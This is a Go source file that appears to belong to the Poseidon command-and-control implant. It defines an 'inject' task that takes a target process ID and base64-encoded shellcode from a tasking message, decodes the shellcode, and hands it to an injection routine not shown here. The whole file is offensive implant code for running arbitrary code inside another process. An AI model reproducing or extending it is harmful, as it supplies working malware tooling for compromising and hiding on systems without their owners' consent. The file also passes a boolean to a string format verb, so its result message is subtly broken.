package inject

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type Injection interface {
	TargetPid() int
	Shellcode() []byte
	Success() bool
	SharedLib() string
}

type Arguments struct {
	PID              int    `json:"pid"`
	EncodedShellcode string `json:"shellcode"`
	LibraryPath      string `json:"library"`
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.TaskItem = task

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	raw, err := base64.StdEncoding.DecodeString(args.EncodedShellcode)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	success, err := injectShellcode(args.PID, raw)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(fmt.Sprintf("Code injection into pid: %d returned result: %s", args.PID, success.Success()))
	threadChannel <- tMsg
}
